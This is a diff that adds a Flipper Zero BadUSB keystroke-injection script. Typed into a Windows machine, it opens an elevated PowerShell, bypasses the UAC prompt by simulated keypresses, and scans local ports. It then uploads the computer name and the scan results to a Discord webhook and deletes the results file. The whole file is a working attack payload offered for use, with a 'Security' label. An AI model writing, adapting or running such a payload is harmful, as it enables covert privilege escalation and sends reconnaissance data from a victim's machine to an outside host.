@@ -1,0 +1,27 @@
+REM Author: NocX
+REM Description: Scan doors and sends them to a Discord webhook.
+REM Version: 1.4
+REM Creation Date: 17/01/2025
+REM Update date: 18/01/2025
+REM Category: Security
+REM ------------------------------------
+REM This script:
+REM 1 Opens PowerShell (Admin)
+REM 2 Scan Doors
+REM 3 Send to discord via a webhook
+REM 4 Closes everything
+REM ------------------------------------
+
+REM ---------- Open PowerShell as Admin ----------
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2500
+LEFTARROW
+ENTER
+DELAY 500
+REM ---------- Scan doors and send to discord  ----------
+STRING $vulnerablePorts=@(21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5900,8080);$allPorts=1..1500;$results=@();$runspaces=[System.Collections.ArrayList]::new();$results+="Common vulnerable ports:";foreach($port in $vulnerablePorts){$runspace=[powershell]::Create().AddScript({param($port)$tcpConnection=New-Object System.Net.Sockets.TcpClient;try{$tcpConnection.Connect("localhost",$port);if($tcpConnection.Connected){$tcpConnection.Close();"Port $port is open"}}catch{"Port $port is closed or filtered"}}).AddArgument($port);$runspaces.Add(@{Runspace=$runspace;Pipe=$runspace.BeginInvoke()})>$null};foreach($runspaceData in $runspaces){$runspace=$runspaceData.Runspace;$pipe=$runspaceData.Pipe;$results+=$runspace.EndInvoke($pipe);$runspace.Dispose()};$results+="------------------------";$results+="Other Controlled Ports (range 1-1500):";foreach($port in $allPorts){if($vulnerablePorts -notcontains $port){$runspace=[powershell]::Create().AddScript({param($port)$tcpConnection=New-Object System.Net.Sockets.TcpClient;try{$tcpConnection.Connect("localhost",$port);if($tcpConnection.Connected){$tcpConnection.Close();"Port $port is open"}}catch{"Port $port is closed or filtered"}}).AddArgument($port);$runspaces.Add(@{Runspace=$runspace;Pipe=$runspace.BeginInvoke()})>$null}};if(-not(Test-Path -Path "C:\Temp")){New-Item -ItemType Directory -Path "C:\Temp"};$resultsFilePath="C:\Temp\port_scan_results.txt";foreach($runspaceData in $runspaces){$runspace=$runspaceData.Runspace;$pipe=$runspaceData.Pipe;$result=$runspace.EndInvoke($pipe);$runspace.Dispose();if($result -like "Port * is open"){$results+=$result}};$results|Out-File -FilePath $resultsFilePath;$webhookUrl="YOUR_DISCORD_WEBHOOK_TOKEN";$Body=@{content="$env:computername Port Scan Results from Flipper Zero"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body|ConvertTo-Json);curl.exe -F "file1=@$resultsFilePath" $webhookUrl;Remove-Item $resultsFilePath;exit
+ENTER
